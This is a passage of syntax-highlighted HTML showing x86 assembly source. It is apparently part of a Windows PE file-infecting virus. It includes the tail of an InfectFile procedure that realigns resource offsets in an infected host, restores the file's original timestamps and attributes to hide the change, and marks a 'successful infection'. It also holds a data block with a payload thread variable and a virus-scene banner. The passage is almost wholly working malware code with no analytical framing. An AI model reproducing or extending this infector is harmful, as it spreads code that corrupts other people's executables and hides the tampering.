       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;and calculate the</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;RVA delta</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RealignResources</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CalculateDelta</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc1">; Point the resources</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; and align in memo</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; save in edi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_RESOURCE_DIRECTORY_SIZE</span><span class="sc0">      </span><span class="sc1">; skip resource dir</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">parse_resource_directory</span><span class="sc0">               </span><span class="sc1">; parse all</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">parse_resource_directory</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.RD_NumberOfNamedEntries</span><span class="sc4">]</span><span class="sc1">; NamedEntries+IdEntries</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.RD_NumberOfIdEntries</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; is our counter</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_RESOURCE_DIRECTORY_SIZE</span><span class="sc0">      </span><span class="sc1">; skip resource dir</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">parse_this_one</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">; save counter</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">; save address</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">parse_resource</span><span class="sc0">                         </span><span class="sc1">; parse the dir</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">; restore address</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">; restore counter</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">; get next entry</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">parse_this_one</span><span class="sc0">                         </span><span class="sc1">; loop until cx=0</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">; return</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">parse_resource</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.RDE_OffsetToData</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; get offset to data</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; get base of resorurces</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">                         </span><span class="sc1">; is it a subdirectory?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">data_is_resource</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">data_is_directory</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">                          </span><span class="sc1">; if it is a subdirectory</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; find it's address and</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">parse_resource_directory</span><span class="sc0">               </span><span class="sc1">; go to parse it too...</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">data_is_resource</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; if it is data, then</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; find out it's address</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRVA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; and increment the offs</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.REDE_OffsetToData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; to data with our Delta</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">; and ret...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RealignRelocs</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infection_succesfull</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;mark good infection</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">close_address</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;unmap view</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">close_map</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;close map object</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFilePointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetEndOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;set EOF</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filetime1</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;restore the file time</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileTime</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;restore file time</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;close file</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">finished</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributesA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileattributes</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;restore attributes</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">succesfull_infection</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">failed_infection</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileopen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">succesfull_infection</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileopen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_smaller</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">get_ebx</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_ebx</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">align_to_filealign</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;here are the aligning</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;procedures</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">align_eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">align_to_sectionalign</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sectionalign</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">align_eax</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">fileattributes</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filetime1</span><span class="sc0">                </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filetime2</span><span class="sc0">                </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filetime3</span><span class="sc0">                </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hfile</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hmap</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">haddress</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">flag</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">additional</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">peheader</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">lastsectionheader</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">last_section_destination</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">codesectionraw</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">codesectionheader</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">finaldestination</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">method</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">pedata</span><span class="sc0">                   </span><span class="sc9">label</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">numberofsections</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; stored as dword!!</span><span class="sc0">
</span><span class="sc5">sizeofoptionalheader</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; stored as dword!!</span><span class="sc0">
</span><span class="sc5">addressofentrypoint</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_imagebase</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sectionalign</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filealign</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sizeofimage</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sizeofheaders</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">checksum</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">numberofrva</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">baseofcode</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">codesection</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">codesectionsize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">lastsection</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">lastsectionsize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">increasement</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">codedelta</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">optionalheader</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">copying</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">lastsectionraw</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">lastsectionrva</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">codesectionrva</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">codesource</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">codedestin</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">PayloadThreadID</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ;</span><span class="sc0">
</span><span class="sc1">;≥ ‹‹‹ ‹‹‹ ‹ ‹ ‹   ‹‹‹ ‹‹‹ ‹‹                      ;</span><span class="sc0">
